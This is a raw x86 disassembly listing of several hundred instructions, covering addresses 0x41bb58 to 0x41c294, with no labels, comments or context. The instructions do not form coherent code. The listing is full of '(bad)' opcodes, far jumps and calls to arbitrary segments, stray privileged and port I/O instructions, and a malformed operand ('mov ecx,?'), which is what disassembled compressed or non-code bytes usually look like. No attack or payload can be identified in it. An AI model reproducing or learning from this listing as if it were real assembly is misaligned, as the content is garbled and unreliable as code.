  41bb58:	mov    cs,WORD PTR [ebp-0x13092582]
  41bb5e:	inc    eax
  41bb5f:	sub    ebx,DWORD PTR [ecx+ecx*4]
  41bb62:	lods   eax,DWORD PTR ds:[esi]
  41bb63:	fmul   QWORD PTR es:[edx-0x6b]
  41bb67:	aam    0xe5
  41bb69:	test   eax,0xa80ede7
  41bb6e:	mov    ebp,0x8b0d7aec
  41bb73:	sbb    eax,0x69ea2210
  41bb78:	mov    ch,0xc1
  41bb7a:	lahf   
  41bb7b:	jecxz  0x41bbd0
  41bb7d:	ins    DWORD PTR es:[edi],dx
  41bb7e:	mov    ds:0x289d87c1,eax
  41bb83:	inc    edi
  41bb84:	shl    DWORD PTR [ecx+0x41],cl
  41bb87:	mov    ah,0x70
  41bb89:	loopne 0x41bb4a
  41bb8b:	stos   BYTE PTR es:[edi],al
  41bb8c:	bound  edx,QWORD PTR [ecx-0x34]
  41bb8f:	cdq    
  41bb90:	pushf  
  41bb91:	adc    cl,BYTE PTR [edx]
  41bb93:	push   cs
  41bb94:	repz retf 
  41bb96:	jmp    0xdfc5:0x9028e18a
  41bb9d:	test   DWORD PTR [eax],ebx
  41bb9f:	sbb    BYTE PTR [edi-0x560813b6],ah
  41bba5:	bound  esi,QWORD PTR [eax]
  41bba7:	data16 mov bh,0x2c
  41bbaa:	mov    ch,BYTE PTR [ebx-0x69edfd7a]
  41bbb0:	jp     0x41bb8c
  41bbb2:	mov    ebx,esi
  41bbb4:	xor    al,0xd7
  41bbb6:	jg     0x41bc08
  41bbb8:	cmp    ebx,esi
  41bbba:	xchg   DWORD PTR [ebx-0x1ee1d536],esi
  41bbc0:	cmp    bh,BYTE PTR [ecx]
  41bbc2:	clc    
  41bbc3:	lods   eax,DWORD PTR ds:[esi]
  41bbc4:	nop
  41bbc5:	fild   WORD PTR [ebx]
  41bbc7:	retf   
  41bbc8:	fcom   QWORD PTR [ebp+0x39]
  41bbcb:	push   0x46
  41bbcd:	fdivr  st,st(2)
  41bbcf:	mov    bh,0xf4
  41bbd1:	lods   al,BYTE PTR ds:[esi]
  41bbd2:	push   0x57
  41bbd4:	repnz fisubr WORD PTR [ebp+0x29bb52d0]
  41bbdb:	cs push eax
  41bbdd:	push   eax
  41bbde:	ja     0x41bc04
  41bbe0:	popf   
  41bbe1:	popa   
  41bbe2:	cmp    eax,0x6ae878be
  41bbe7:	sub    al,0x2a
  41bbe9:	and    edi,DWORD PTR [edi+0x55bec967]
  41bbef:	dec    ebx
  41bbf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbf1:	iret   
  41bbf2:	fmul   QWORD PTR [eax+ebx*4]
  41bbf5:	sti    
  41bbf6:	jb     0x41bbcd
  41bbf8:	xchg   ecx,eax
  41bbf9:	or     cl,dl
  41bbfb:	retf   
  41bbfc:	dec    ecx
  41bbfd:	rcr    BYTE PTR [ecx*8-0x109a5fa9],1
  41bc04:	cmp    DWORD PTR [eax+0x5c],eax
  41bc07:	int3   
  41bc08:	inc    ebx
  41bc09:	xchg   edx,eax
  41bc0a:	gs out 0x8,al
  41bc0d:	cmp    al,0x11
  41bc0f:	adc    eax,0x5b336e60
  41bc14:	xor    eax,0x705095b2
  41bc19:	adc    al,0x50
  41bc1b:	scas   eax,DWORD PTR es:[edi]
  41bc1c:	push   esi
  41bc1d:	outs   dx,BYTE PTR ds:[esi]
  41bc1e:	pop    ds
  41bc1f:	mov    DWORD PTR [edi+0x46ddf7be],esi
  41bc25:	pusha  
  41bc26:	rcr    BYTE PTR [ebx-0x39],0x6a
  41bc2a:	sub    ecx,DWORD PTR [edi-0x5410f42c]
  41bc30:	aaa    
  41bc31:	das    
  41bc32:	sbb    edi,edi
  41bc34:	clc    
  41bc35:	push   ecx
  41bc36:	std    
  41bc37:	lea    eax,[ebx]
  41bc39:	scas   al,BYTE PTR es:[edi]
  41bc3a:	or     BYTE PTR [esi],al
  41bc3c:	mov    ecx,?
  41bc3e:	xor    al,0xb2
  41bc40:	jp     0x41bc1e
  41bc42:	(bad)  
  41bc43:	fild   QWORD PTR [ebx+0x8520ea]
  41bc49:	push   ebx
  41bc4a:	(bad)  
  41bc4b:	adc    BYTE PTR [ebx-0x59d71274],cl
  41bc51:	inc    edi
  41bc52:	ret    0x44a
  41bc55:	mov    ebp,0xf49b1394
  41bc5a:	es or  eax,0x5f74fe0c
  41bc60:	pop    edx
  41bc61:	mov    bl,0xdd
  41bc63:	pusha  
  41bc64:	test   eax,0x7f73e3f6
  41bc69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc6a:	mov    edx,0x8956790
  41bc6f:	xor    esp,DWORD PTR [edi-0x57]
  41bc72:	mov    ecx,0xd59927d5
  41bc77:	inc    edx
  41bc78:	mov    ecx,0x2bd25674
  41bc7d:	js     0x41bc21
  41bc7f:	adc    esi,edx
  41bc81:	sbb    BYTE PTR [esi],dh
  41bc83:	ins    BYTE PTR es:[edi],dx
  41bc84:	jl     0x41bc84
  41bc86:	sbb    dl,ah
  41bc88:	inc    ebx
  41bc89:	inc    edx
  41bc8a:	loopne 0x41bcba
  41bc8c:	jb     0x41bcec
  41bc8e:	mov    bl,0x3e
  41bc90:	ins    BYTE PTR es:[edi],dx
  41bc91:	xchg   edx,eax
  41bc92:	or     eax,0xdb975114
  41bc97:	jecxz  0x41bca0
  41bc99:	xor    eax,0xa37cd113
  41bc9e:	aas    
  41bc9f:	pushf  
  41bca0:	pop    eax
  41bca1:	enter  0xa12d,0x1c
  41bca5:	arpl   WORD PTR [ecx+0x24d868c7],di
  41bcab:	jbe    0x41bc5d
  41bcad:	sub    esi,ebp
  41bcaf:	dec    eax
  41bcb0:	dec    edi
  41bcb1:	add    DWORD PTR [edx],eax
  41bcb3:	clc    
  41bcb4:	push   ds
  41bcb5:	xchg   ebx,eax
  41bcb6:	pushf  
  41bcb7:	mov    bl,0x47
  41bcb9:	ins    BYTE PTR es:[edi],dx
  41bcba:	push   eax
  41bcbb:	sbb    ch,BYTE PTR [edi-0x7dfd1629]
  41bcc1:	enter  0x1eb0,0xfb
  41bcc5:	out    0xc6,al
  41bcc7:	scas   al,BYTE PTR es:[edi]
  41bcc8:	lds    eax,FWORD PTR [ecx+0x7b]
  41bccb:	or     eax,0x5da4f7f8
  41bcd0:	cmp    eax,DWORD PTR [ecx]
  41bcd2:	inc    ecx
  41bcd3:	sub    eax,0x94d0d889
  41bcd8:	lock jle 0x41bd12
  41bcdb:	mov    esi,0x68d0cae3
  41bce0:	add    al,0x81
  41bce2:	inc    edi
  41bce3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bce4:	adc    DWORD PTR [ebx-0x9f4fdba],edx
  41bcea:	ffreep st(3)
  41bcec:	add    eax,0x19309663
  41bcf1:	push   esi
  41bcf2:	int    0x61
  41bcf4:	std    
  41bcf5:	and    ebp,DWORD PTR [esi]
  41bcf7:	mov    eax,0x55002504
  41bcfc:	cdq    
  41bcfd:	sahf   
  41bcfe:	inc    ebx
  41bcff:	and    al,0x1f
  41bd01:	and    bh,cl
  41bd03:	jae    0x41bce6
  41bd05:	xchg   ecx,eax
  41bd06:	pop    ebx
  41bd07:	cwde   
  41bd08:	aam    0x47
  41bd0a:	fmul   DWORD PTR ds:0xa881ed7d
  41bd10:	int3   
  41bd11:	jmp    0x41bd3d
  41bd13:	aaa    
  41bd14:	and    al,ah
  41bd16:	adc    DWORD PTR [eax-0x4f],esi
  41bd19:	in     eax,0xea
  41bd1b:	jb     0x41bd7a
  41bd1d:	leave  
  41bd1e:	sbb    eax,0x7f8907aa
  41bd23:	jge    0x41bcca
  41bd25:	dec    esp
  41bd26:	push   ds
  41bd27:	(bad)  
  41bd29:	repnz fwait
  41bd2b:	xchg   esp,eax
  41bd2c:	jg     0x41bd29
  41bd2e:	jo     0x41bcd4
  41bd30:	loop   0x41bd0d
  41bd32:	jno    0x41bcef
  41bd34:	sub    esp,DWORD PTR [edx-0x6a]
  41bd37:	mov    bh,BYTE PTR [ecx+0x2088b149]
  41bd3d:	dec    eax
  41bd3e:	ret    
  41bd3f:	add    edi,ebx
  41bd41:	sbb    BYTE PTR [edx-0x3],0x20
  41bd45:	fs (bad) 
  41bd48:	pusha  
  41bd49:	dec    ecx
  41bd4a:	fnstsw WORD PTR [ebx+esi*8+0x47]
  41bd4e:	xchg   edi,eax
  41bd4f:	call   0x1e8c:0x58eeda65
  41bd56:	pop    esi
  41bd57:	sbb    dh,bh
  41bd59:	ins    BYTE PTR es:[edi],dx
  41bd5a:	js     0x41bd54
  41bd5c:	xor    BYTE PTR [edx+0x53],al
  41bd5f:	sub    esp,eax
  41bd61:	pop    ds
  41bd62:	push   0x11e3c584
  41bd67:	push   eax
  41bd68:	xchg   esi,eax
  41bd69:	cwde   
  41bd6a:	xchg   esi,eax
  41bd6b:	dec    BYTE PTR [ecx]
  41bd6d:	and    al,BYTE PTR [edi]
  41bd6f:	xor    DWORD PTR ds:0x38f7767,ebp
  41bd75:	push   0x55
  41bd77:	ins    DWORD PTR es:[edi],dx
  41bd78:	cmp    bh,bl
  41bd7a:	rcr    dh,cl
  41bd7c:	hlt    
  41bd7d:	mov    cl,0xed
  41bd7f:	jge    0x41bd2a
  41bd81:	push   ecx
  41bd82:	pop    ebx
  41bd83:	jecxz  0x41bd71
  41bd85:	loopne 0x41bddf
  41bd87:	lods   eax,DWORD PTR ds:[esi]
  41bd88:	inc    edi
  41bd89:	psrlw  mm0,mm2
  41bd8c:	mov    al,0x58
  41bd8e:	std    
  41bd8f:	neg    DWORD PTR [ebx+0x6d3117ae]
  41bd95:	test   BYTE PTR [edx+0x26],bh
  41bd98:	mov    esi,ss
  41bd9a:	lds    esi,FWORD PTR cs:[ebp-0x1c]
  41bd9e:	inc    esi
  41bd9f:	iret   
  41bda0:	mov    ecx,0xf7519bc
  41bda5:	mov    edi,0xef4210a4
  41bdaa:	stos   DWORD PTR es:[edi],eax
  41bdab:	call   0x9070:0xd933aa4a
  41bdb2:	add    DWORD PTR [esi+0x12],eax
  41bdb5:	mov    edx,0xe95c10bd
  41bdba:	(bad)  
  41bdbb:	fisubr WORD PTR ds:0x269a8735
  41bdc1:	mov    eax,ds:0xbf722d22
  41bdc6:	jbe    0x41bdb1
  41bdc8:	or     ch,bh
  41bdca:	pop    edi
  41bdcb:	ret    0x22b1
  41bdce:	lds    ebp,FWORD PTR [eax]
  41bdd0:	stos   DWORD PTR es:[edi],eax
  41bdd1:	sbb    al,0x2d
  41bdd3:	test   eax,0x881d2904
  41bdd8:	fisttp QWORD PTR [ebx+0x57]
  41bddb:	jge    0x41be49
  41bddd:	test   BYTE PTR [ecx+0x5a],0x7b
  41bde1:	pop    ds
  41bde2:	inc    esi
  41bde3:	mov    ebx,0xda77743c
  41bde8:	leave  
  41bde9:	mov    cl,0xad
  41bdeb:	mov    esp,0x985da7bc
  41bdf0:	retf   
  41bdf1:	push   cs
  41bdf2:	sbb    eax,0xafd1113c
  41bdf7:	leave  
  41bdf8:	mov    ds:0x4431cf88,eax
  41bdfd:	test   al,0xa7
  41bdff:	add    ebx,DWORD PTR [edx+0x34]
  41be02:	popa   
  41be03:	popa   
  41be04:	cmp    al,0xc9
  41be06:	shl    DWORD PTR [edx-0x2d],0x91
  41be0a:	mov    ecx,0x780f0c13
  41be0f:	push   edi
  41be10:	lods   eax,DWORD PTR ds:[esi]
  41be11:	push   esp
  41be12:	xor    edx,DWORD PTR [esi+0x1f]
  41be15:	pop    edx
  41be16:	lds    esp,FWORD PTR [edx-0x1a]
  41be19:	lds    ebp,FWORD PTR [esp+eiz*2]
  41be1c:	jmp    0x41bda9
  41be1e:	sbb    eax,0x82d8374a
  41be23:	dec    edi
  41be24:	push   esi
  41be25:	cmc    
  41be26:	cmp    cl,ah
  41be28:	cs call 0x4c2a1d5e
  41be2e:	dec    esi
  41be2f:	rcl    BYTE PTR [esp+esi*8+0x5f8d1584],cl
  41be36:	and    al,0x57
  41be38:	imul   esi,DWORD PTR [edx-0x4e36e523],0x9973d96d
  41be42:	pop    ds
  41be43:	dec    esp
  41be44:	add    DWORD PTR [ebx-0x1f],esi
  41be47:	je     0x41be2d
  41be49:	mov    eax,0xf4d8d35
  41be4e:	das    
  41be4f:	dec    DWORD PTR ds:0xf3bd78dc
  41be55:	mov    edx,0xc33bef70
  41be5a:	cli    
  41be5b:	out    dx,eax
  41be5c:	int    0x64
  41be5e:	cli    
  41be5f:	mov    al,ds:0x426471a8
  41be64:	xchg   esi,eax
  41be65:	inc    bp
  41be67:	cld    
  41be68:	inc    BYTE PTR [edi+edx*8+0x21]
  41be6c:	fistp  QWORD PTR [ecx]
  41be6e:	pop    ecx
  41be6f:	into   
  41be70:	and    BYTE PTR [ebx-0x5fe35f88],bl
  41be76:	sub    eax,0x6b258b3e
  41be7b:	mov    edi,0x6f4d023b
  41be80:	dec    ebx
  41be81:	dec    ebp
  41be82:	pop    eax
  41be83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be84:	xchg   ebp,eax
  41be85:	out    0x59,al
  41be87:	adc    edi,ebp
  41be89:	out    0x7f,al
  41be8b:	dec    edi
  41be8c:	mov    edi,0x291ecc88
  41be91:	(bad)  
  41be92:	(bad)  
  41be93:	xlat   BYTE PTR ds:[ebx]
  41be94:	fistp  QWORD PTR [eax-0x60]
  41be97:	in     al,dx
  41be98:	push   ds
  41be99:	xchg   esp,eax
  41be9a:	xchg   edx,eax
  41be9b:	jmp    0x170ddd50
  41bea0:	jl     0x41bf1f
  41bea2:	in     eax,0xf7
  41bea4:	test   al,0xea
  41bea6:	dec    ecx
  41bea7:	jecxz  0x41bec7
  41bea9:	add    ecx,DWORD PTR [ebp-0x4]
  41beac:	pop    ds
  41bead:	adc    BYTE PTR [ecx-0x7f],bh
  41beb0:	xchg   esp,eax
  41beb1:	(bad)  [esi-0x3e0bff7b]
  41beb7:	push   ecx
  41beb8:	inc    ebx
  41beb9:	pop    esp
  41beba:	jnp    0x41bf3b
  41bebc:	xor    eax,0xefeee652
  41bec1:	and    DWORD PTR [ebx+0xfc24a87],ecx
  41bec7:	mov    ch,0x56
  41bec9:	jp     0x41be76
  41becb:	xor    eax,0xd51e4093
  41bed0:	or     ecx,DWORD PTR [ebp-0xf]
  41bed3:	loopne 0x41bf33
  41bed5:	sub    edx,DWORD PTR [ebx+0x57]
  41bed8:	imul   eax,DWORD PTR [esi],0xcdea3561
  41bede:	hlt    
  41bedf:	shl    DWORD PTR [ecx+0x43],1
  41bee2:	adc    BYTE PTR [eax],ch
  41bee4:	or     edi,ebx
  41bee6:	mov    ebp,0x37ca2f43
  41beeb:	jne    0x41bf18
  41beed:	daa    
  41beee:	popf   
  41beef:	mov    edi,0xa805740
  41bef4:	push   edi
  41bef5:	pop    edi
  41bef6:	repz dec ebp
  41bef8:	dec    ebp
  41bef9:	jae    0x41bf64
  41befb:	and    eax,edi
  41befd:	mov    DWORD PTR [edi+0x34],ebx
  41bf00:	xchg   edx,eax
  41bf01:	dec    edi
  41bf02:	jecxz  0x41bea6
  41bf04:	or     edi,DWORD PTR [edx+eiz*1]
  41bf07:	cmp    DWORD PTR [eax-0x3cd2f20],edi
  41bf0d:	push   ss
  41bf0e:	cwde   
  41bf0f:	pop    ebx
  41bf10:	add    al,0x37
  41bf12:	repz pop edx
  41bf14:	test   al,0x2f
  41bf16:	jp     0x41bf97
  41bf18:	test   BYTE PTR [ecx-0x48],bh
  41bf1b:	inc    eax
  41bf1c:	xor    ecx,DWORD PTR [esi-0x25]
  41bf1f:	inc    edi
  41bf20:	outs   dx,DWORD PTR ds:[esi]
  41bf21:	jp     0x41bf9c
  41bf23:	xor    ah,al
  41bf25:	pusha  
  41bf26:	dec    ebx
  41bf27:	push   esp
  41bf28:	fnstsw WORD PTR [esi+ebx*1-0x54efee6b]
  41bf2f:	xchg   ebp,eax
  41bf30:	pop    esp
  41bf31:	mov    DWORD PTR ds:0xad81f521,0xe5881db5
  41bf3b:	sbb    BYTE PTR [edx+0x61efb9cd],cl
  41bf41:	jg     0x41bf03
  41bf43:	cmp    BYTE PTR [eax],cl
  41bf45:	mov    edi,esp
  41bf47:	add    dh,BYTE PTR [ebx]
  41bf49:	inc    ecx
  41bf4a:	mov    bh,0xbb
  41bf4c:	inc    ecx
  41bf4d:	cmp    BYTE PTR [edi+0x7a2a35e0],bl
  41bf53:	repnz mov ebp,0x378d98ab
  41bf59:	rol    ecx,1
  41bf5b:	or     bh,dh
  41bf5d:	sbb    DWORD PTR [eax+0x10047667],0x68
  41bf64:	jle    0x41bf66
  41bf66:	pop    edx
  41bf67:	push   eax
  41bf68:	pop    ecx
  41bf69:	mov    bl,0x2c
  41bf6b:	adc    DWORD PTR [esi-0xf],ebp
  41bf6e:	(bad)  
  41bf70:	pop    ds
  41bf71:	push   ss
  41bf72:	pop    ds
  41bf73:	sbb    BYTE PTR [ecx],0xff
  41bf76:	ror    DWORD PTR [esi-0x479897b5],1
  41bf7c:	daa    
  41bf7d:	ds int 0xbb
  41bf80:	sbb    BYTE PTR [esi],0x18
  41bf83:	adc    ch,BYTE PTR [ebx]
  41bf85:	sub    BYTE PTR [ebx],0x56
  41bf88:	loopne 0x41bf42
  41bf8a:	aaa    
  41bf8b:	inc    ecx
  41bf8c:	mov    edi,0x29a31b32
  41bf91:	dec    edi
  41bf92:	mov    ds:0xe021bade,eax
  41bf97:	jns    0x41bf53
  41bf99:	fisubr DWORD PTR [ebx]
  41bf9b:	jns    0x41bf94
  41bf9d:	mov    cl,0x52
  41bf9f:	ss nop
  41bfa1:	xchg   esp,eax
  41bfa2:	push   es
  41bfa3:	aaa    
  41bfa4:	data16 ficomp DWORD PTR [ebx+0x673779e5]
  41bfab:	jmp    0x1bfeeb2c
  41bfb0:	rol    al,1
  41bfb2:	xor    edi,esi
  41bfb4:	push   ss
  41bfb5:	mov    ds:0x73884b8a,eax
  41bfba:	xor    dl,dh
  41bfbc:	outs   dx,BYTE PTR ds:[esi]
  41bfbd:	pop    ecx
  41bfbe:	sbb    dh,ah
  41bfc0:	rcr    DWORD PTR cs:[eax+edi*1-0x1b4e6524],1
  41bfc8:	sub    ch,BYTE PTR [edx]
  41bfca:	cdq    
  41bfcb:	and    ecx,DWORD PTR [edx+0x54c1c37c]
  41bfd1:	mov    edx,0xb93169c8
  41bfd6:	mov    al,ds:0x4578af4d
  41bfdb:	test   BYTE PTR [edx+0x52],ch
  41bfde:	les    edx,FWORD PTR [eax+0x7b7458bb]
  41bfe4:	pop    ebx
  41bfe5:	mov    ebp,0x5edf58de
  41bfea:	push   0x6fe8a070
  41bfef:	repnz shl BYTE PTR [ebx+0x4a],0x76
  41bff4:	lea    edx,[ebx+0x6097215b]
  41bffa:	dec    eax
  41bffb:	xor    BYTE PTR [ebx+0x527cdcf3],ch
  41c001:	ja     0x41c050
  41c003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c004:	in     eax,0x25
  41c006:	mov    ch,0xbf
  41c008:	leave  
  41c009:	xchg   ecx,eax
  41c00a:	es (bad) 
  41c00c:	push   ds
  41c00d:	fsubr  DWORD PTR [edi-0x6a]
  41c010:	cmp    al,0xfe
  41c012:	jo     0x41c08d
  41c014:	pmaxsw mm6,QWORD PTR [esi]
  41c017:	xor    BYTE PTR [eax+ecx*8+0x27],dh
  41c01b:	into   
  41c01c:	push   es
  41c01d:	pushf  
  41c01e:	loope  0x41c045
  41c020:	jbe    0x41c03e
  41c022:	xor    eax,0x85815e9c
  41c027:	push   0xffffffdb
  41c029:	sbb    edx,edx
  41c02b:	out    0x5f,eax
  41c02d:	xor    dh,BYTE PTR [edi+0x5b]
  41c030:	jp     0x41c005
  41c032:	pop    eax
  41c033:	xchg   ebp,eax
  41c034:	cmp    eax,0x836ef757
  41c039:	dec    ebp
  41c03a:	ja     0x41c030
  41c03c:	jo     0x41bfef
  41c03e:	(bad)  
  41c03f:	mov    cl,0xdf
  41c041:	mov    ch,0xef
  41c043:	rcr    edx,cl
  41c045:	test   eax,0xea16e36d
  41c04a:	or     al,0xc6
  41c04c:	mov    bl,0x35
  41c04e:	add    esp,ecx
  41c050:	popf   
  41c051:	dec    ebx
  41c052:	pop    ss
  41c053:	jl     0x41c0c6
  41c055:	out    0x63,eax
  41c057:	out    0x50,al
  41c059:	retf   
  41c05a:	push   ds
  41c05b:	test   al,0xf8
  41c05d:	pop    edx
  41c05e:	ret    0x9629
  41c061:	clc    
  41c062:	xor    DWORD PTR [eax],eax
  41c064:	les    ecx,FWORD PTR [esi+0x65]
  41c067:	jecxz  0x41c0b0
  41c069:	inc    ebx
  41c06a:	xchg   ebp,eax
  41c06b:	dec    edx
  41c06c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c06d:	sub    BYTE PTR [ebx],bl
  41c06f:	dec    esi
  41c070:	mov    ds:0xd041737,al
  41c075:	xchg   ebp,eax
  41c076:	in     eax,0xe1
  41c078:	out    0x77,eax
  41c07a:	fstp   TBYTE PTR [ecx+0x1e]
  41c07d:	hlt    
  41c07e:	out    dx,eax
  41c07f:	in     eax,dx
  41c080:	adc    bh,dl
  41c082:	and    eax,0xa0febd6e
  41c087:	jae    0x41c0fd
  41c089:	(bad)  
  41c08b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c08c:	jbe    0x41c04c
  41c08e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c08f:	add    al,0xff
  41c091:	push   es
  41c092:	retf   0x5e0a
  41c095:	add    eax,0xb2ab7580
  41c09a:	fild   DWORD PTR [edi]
  41c09c:	push   edi
  41c09d:	and    bh,BYTE PTR [ebx+0x7209d1a6]
  41c0a3:	sti    
  41c0a4:	mov    edi,0xcbf4cf24
  41c0a9:	xor    ebx,edx
  41c0ab:	test   eax,0x47dc5888
  41c0b0:	push   eax
  41c0b1:	add    BYTE PTR [edx-0x42],0x4c
  41c0b5:	test   al,0xf5
  41c0b7:	pop    ebp
  41c0b8:	adc    eax,0x8e52cf5f
  41c0bd:	or     dl,BYTE PTR [edi]
  41c0bf:	psllw  mm0,QWORD PTR [eax-0x2a]
  41c0c3:	in     al,0xe6
  41c0c5:	add    cl,BYTE PTR [edx+0x76]
  41c0c8:	into   
  41c0c9:	lds    esp,FWORD PTR [edx+0x2f]
  41c0cc:	ror    dh,1
  41c0ce:	dec    ebx
  41c0cf:	or     ah,BYTE PTR [edi-0x56]
  41c0d2:	sar    DWORD PTR [ecx],1
  41c0d4:	adc    al,0xe1
  41c0d6:	int3   
  41c0d7:	into   
  41c0d8:	shr    BYTE PTR [esi+0x2],0x15
  41c0dc:	xchg   BYTE PTR [edi-0x4e],ch
  41c0df:	fcomp  DWORD PTR [edx]
  41c0e1:	jmp    0x41c0af
  41c0e3:	scas   eax,DWORD PTR es:[edi]
  41c0e4:	adc    al,0x92
  41c0e6:	pop    eax
  41c0e7:	test   al,0xda
  41c0e9:	xlat   BYTE PTR ds:[ebx]
  41c0ea:	int3   
  41c0eb:	or     BYTE PTR [ecx+eiz*2],0xf4
  41c0ef:	(bad)  
  41c0f0:	test   eax,0x1ad933ed
  41c0f5:	out    dx,eax
  41c0f6:	mov    edx,0x7224b44f
  41c0fb:	adc    dl,ah
  41c0fd:	pextrw edi,(bad),0xc5
  41c0ff:	cmp    ah,BYTE PTR [ebx+0x15]
  41c102:	inc    esi
  41c103:	jmp    0x94a514a1
  41c108:	mov    ah,0x55
  41c10a:	mov    dh,0x7f
  41c10c:	jne    0x41c0c1
  41c10e:	sbb    BYTE PTR [esi+0x11],cl
  41c111:	or     esp,DWORD PTR [ecx+0x1c]
  41c114:	inc    eax
  41c115:	enter  0x8af6,0x71
  41c119:	lods   al,BYTE PTR es:[esi]
  41c11b:	xor    al,al
  41c11d:	cmp    eax,0xd1a39e6d
  41c122:	loopne 0x41c0ce
  41c124:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c125:	mov    bh,0xa8
  41c127:	in     al,0xb5
  41c129:	ret    
  41c12a:	or     DWORD PTR [eax+ebx*1+0x70484d48],ebx
  41c131:	ins    BYTE PTR es:[edi],dx
  41c132:	pop    ss
  41c133:	fadd   DWORD PTR [ecx+esi*1+0x3e1d931b]
  41c13a:	ret    0x3dfc
  41c13d:	push   eax
  41c13e:	ror    BYTE PTR [ebx+edx*4-0x57df6bb5],cl
  41c145:	dec    ecx
  41c146:	add    bl,BYTE PTR [eax-0x1067c1f7]
  41c14c:	add    DWORD PTR [ecx+0x1c],ecx
  41c14f:	fmul   QWORD PTR [ecx-0x7b]
  41c152:	push   ss
  41c153:	mov    bh,BYTE PTR fs:[ebx]
  41c156:	loope  0x41c1c3
  41c158:	fcom   DWORD PTR [esi-0x6af11fcd]
  41c15e:	and    dl,BYTE PTR [ecx+0x4b]
  41c161:	fidiv  DWORD PTR [edx+0x37d831f0]
  41c167:	pop    edx
  41c168:	xor    ecx,eax
  41c16a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c16b:	and    dh,ah
  41c16d:	push   esi
  41c16e:	sbb    bh,BYTE PTR [ecx-0x78]
  41c171:	cwde   
  41c172:	and    ebx,DWORD PTR [edi+0x32]
  41c175:	xchg   esp,edx
  41c177:	inc    esi
  41c178:	push   ecx
  41c179:	popa   
  41c17a:	dec    esp
  41c17c:	push   esi
  41c17d:	mov    bh,0x6
  41c17f:	paddq  mm3,mm4
  41c182:	mov    ecx,0x286ed79c
  41c187:	add    eax,0xdc23787c
  41c18c:	add    DWORD PTR [edi-0x5960562],ebp
  41c192:	outs   dx,BYTE PTR ds:[esi]
  41c193:	rep outs dx,DWORD PTR ds:[esi]
  41c195:	ror    BYTE PTR [edx+0x2e],1
  41c198:	mov    esp,0x455ef5b
  41c19d:	aas    
  41c19e:	repnz (bad) 
  41c1a0:	shl    BYTE PTR ds:0x307f062b,0xaa
  41c1a7:	jns    0x41c1c4
  41c1a9:	in     eax,0x52
  41c1ab:	jg     0x41c21f
  41c1ad:	fwait
  41c1ae:	and    BYTE PTR [ecx],dh
  41c1b0:	mov    DWORD PTR [esi+0x65475a8f],eax
  41c1b6:	jne    0x41c223
  41c1b8:	rol    BYTE PTR [bp+si],0xdc
  41c1bc:	ficom  WORD PTR [eax+ecx*8+0x5f]
  41c1c0:	icebp  
  41c1c1:	outs   dx,DWORD PTR ds:[esi]
  41c1c2:	add    al,0x62
  41c1c4:	into   
  41c1c5:	jg     0x41c1b6
  41c1c7:	daa    
  41c1c8:	or     eax,0x237723a4
  41c1cd:	ror    DWORD PTR [esi],0xd7
  41c1d0:	pop    ebp
  41c1d1:	jl     0x41c1ef
  41c1d3:	adc    ch,dl
  41c1d5:	jl     0x41c1f6
  41c1d7:	xor    DWORD PTR ds:0xe2a40c9e,ecx
  41c1dd:	cmp    BYTE PTR [edi],al
  41c1df:	dec    esi
  41c1e0:	add    DWORD PTR [ecx],esi
  41c1e2:	push   cs
  41c1e3:	nop
  41c1e4:	push   0xaa99bf3a
  41c1e9:	sub    DWORD PTR [ebp-0x4f],ecx
  41c1ec:	or     eax,DWORD PTR [esp+eax*2]
  41c1ef:	(bad)  
  41c1f0:	mov    ecx,edi
  41c1f2:	lock dec eax
  41c1f4:	data16 js 0x41c203
  41c1f7:	pop    eax
  41c1f8:	mov    edi,0x7868c9bc
  41c1fd:	push   ebx
  41c1fe:	pop    ebx
  41c1ff:	dec    edi
  41c200:	add    ch,0xce
  41c203:	inc    ecx
  41c204:	mov    al,ds:0xf4aa8f3d
  41c209:	stos   DWORD PTR es:[edi],eax
  41c20a:	xchg   edi,eax
  41c20b:	pop    es
  41c20c:	mov    DWORD PTR [ecx],0x2257b5da
  41c212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c213:	jl     0x41c294
  41c215:	mov    esp,0x15ba3625
  41c21a:	inc    ebp
  41c21b:	test   eax,0x55a242b0
  41c220:	fidivr DWORD PTR [ecx+0xb20e273]
  41c226:	pop    eax
  41c227:	arpl   si,ax
  41c229:	or     ebx,DWORD PTR [eax]
  41c22b:	mov    esp,0xc09f67f7
  41c230:	loop   0x41c260
  41c232:	push   ebp
  41c233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c234:	mov    edx,0xc24a9dd2
  41c239:	dec    eax
  41c23a:	inc    esi
  41c23b:	xor    al,0xd6
  41c23d:	mov    eax,ds:0xcb242974
  41c242:	stos   DWORD PTR es:[edi],eax
  41c243:	and    al,0xce
  41c245:	and    DWORD PTR [eax],ebx
  41c247:	dec    eax
  41c248:	jbe    0x41c1fe
  41c24a:	and    dh,bl
  41c24c:	clc    
  41c24d:	push   ss
  41c24e:	jg     0x41c1f8
  41c250:	and    BYTE PTR [edi+0x21],bl
  41c253:	inc    edx
  41c254:	pop    ebp
  41c255:	aas    
  41c256:	fsubr  DWORD PTR [eax+esi*1-0x10]
  41c25a:	dec    ebp
  41c25b:	pop    esi
  41c25c:	imul   edx,DWORD PTR [esi+0x486dbe1c],0xd31c775
  41c266:	push   es
  41c267:	leave  
  41c268:	fisttp WORD PTR [eax-0x2e39214d]
  41c26e:	lock ds inc esi
  41c271:	and    al,0x48
  41c273:	aas    
  41c274:	loopne 0x41c2c9
  41c276:	loop   0x41c2f4
  41c278:	or     cl,BYTE PTR [ebx-0x5f0b5e34]
  41c27e:	ds gs jae 0x41c237
  41c282:	pop    edx
  41c283:	ins    DWORD PTR es:[edi],dx
  41c284:	ins    DWORD PTR es:[edi],dx
  41c285:	je     0x41c2ac
  41c287:	mov    DWORD PTR [ebx+0x7d],ebx
  41c28a:	pop    ebx
  41c28b:	ja     0x41c27c
  41c28d:	cwde   
  41c28e:	lea    ebp,[ecx-0x333e5e5d]
  41c294:	popa   
